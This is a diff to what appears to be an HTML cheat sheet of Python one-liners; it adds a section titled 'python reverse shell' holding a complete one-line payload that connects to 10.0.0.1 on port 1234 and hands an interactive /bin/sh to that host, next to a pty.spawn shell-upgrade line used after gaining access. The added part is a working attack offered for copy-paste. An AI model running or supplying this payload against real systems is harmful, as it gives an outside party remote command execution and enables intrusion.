@@ -445,6 +445,10 @@ while True:
     c.send('message')
     c.close()
 </pre>
+<h4>python reverse shell</h4>
+<pre>
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+</pre>
 <h4>python shell</h4>
 <pre>
 python3 -c 'import pty;pty.spawn("/bin/bash")'
